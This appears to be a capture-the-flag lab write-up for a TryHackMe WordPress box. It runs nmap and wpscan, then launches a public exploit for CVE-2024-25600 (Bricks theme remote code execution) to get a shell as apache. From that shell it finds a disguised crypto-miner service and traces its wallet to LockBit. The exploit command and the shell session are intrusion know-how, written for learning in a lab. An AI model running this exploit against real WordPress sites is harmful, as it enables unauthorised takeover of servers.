@@ -1,0 +1,148 @@
+Recon:
+
+~/Downloads > nmap -Pn -sC -A -sV -T4 10.10.65.45                                                                                                                                                                                  took 26s
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 13:24 EDT
+Nmap scan report for 10.10.65.45
+Host is up (0.55s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 10:f3:39:c5:4e:46:76:08:55:c7:d5:43:da:bb:89:04 (RSA)
+|   256 ae:dc:3c:c9:d0:ba:34:27:03:46:45:13:62:c0:e4:ca (ECDSA)
+|_  256 8f:5e:e3:18:72:e6:cc:e7:b6:9c:fe:9e:f9:41:ef:03 (ED25519)
+80/tcp   open  http     Python http.server 3.5 - 3.10
+|_http-server-header: WebSockify Python/3.8.10
+|_http-title: Error response
+443/tcp  open  ssl/http Apache httpd
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Brick by Brick
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-generator: WordPress 6.5
+|_http-server-header: Apache
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
+| Not valid before: 2024-04-02T11:59:14
+|_Not valid after:  2025-04-02T11:59:14
+3306/tcp open  mysql    MySQL (unauthorized)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=9/9%OT=22%CT=1%CU=42578%PV=Y%DS=5%DC=T%G=Y%TM=68C0630C
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=2%ISR=110%TI=Z%CI=Z%II=I%TS=A)SEQ(
+OS:SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=RI%TS=A)SEQ(SP=F7%GCD=1%ISR=101%TI=Z%C
+OS:I=Z%II=RI%TS=A)SEQ(SP=FC%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=FD%GCD=1%IS
+OS:R=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11
+OS:NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B
+OS:3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)
+OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=
+OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
+OS:6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
+OS:%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
+OS:=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 5 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1723/tcp)
+HOP RTT       ADDRESS
+1   380.34 ms 10.17.0.1
+2   ... 4
+5   563.21 ms 10.10.65.45
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 88.93 seconds
+
+We first "10.10.65.45 bricks.thm" to our hosts file
+
+Since we saw that there was a disallowed entry of wp-admin, we tried to use wpscan for user enumeration but nothing worked
+
+~/Downloads >  wpscan --url http://bricks.thm/wordpress -e u --rua --no-update 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+
+Scan Aborted: The remote website is up, but does not seem to be running WordPress.
+
+After searching for a while on google i came across this exloit CVE-2024–25600
+
+Using this exploit to gain a shell:
+
+~/Downloads/CVE-2024-25600 on main !1 > python3 exploit.py -u https://bricks.thm                                                                                                                                          py CVE-2024-25600
+[*] Nonce found: 22c90d736c
+[+] https://bricks.thm is vulnerable to CVE-2024-25600. Command output: apache
+[!] Shell is ready, please type your commands UwU
+# ls
+650c844110baced87e1606453b93f22a.txt
+index.php
+kod
+license.txt
+phpmyadmin
+readme.html
+wp-activate.php
+wp-admin
+wp-blog-header.php
+wp-comments-post.php
+wp-config-sample.php
+wp-config.php
+wp-content
+wp-cron.php
+wp-includes
+wp-links-opml.php
+wp-load.php
+wp-login.php
+wp-mail.php
+wp-settings.php
+wp-signup.php
+wp-trackback.php
+xmlrpc.php
+
+# cat 650c844110baced87e1606453b93f22a.txt
+THM{REDACTED}
+
+Looking for the name of the suspicious process:
+
+# ps -ef
+
+root       59994       1  0 18:09 ?        00:00:00 /lib/NetworkManager/nm-inet-dialog
+
+What is the service name affiliated with the suspicious process?
+
+# systemctl list-units
+
+ubuntu.service                                   loaded active     running   TRYHACK3M
+
+What is the log file name of the miner instance?
+
+# ls /lib/NetworkManager
+
+inet.conf
+
+What is the wallet address of the miner instance?
+
+apache@tryhackme:/lib/NetworkManager$ head -n 20 inet.conf
+
+5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64***********
+
+The string was encoded, we used CyberChef to decode the string and we get the decoded wallet address
+
+bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
+
+The wallet address used has been involved in transactions between wallets belonging to which threat group?
+
+Searching for the receiver of BTC: 32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM on googles gave us the answer
+
+https://www.chainalysis.com/blog/lockbit-takedown-sanctions-february-2024/
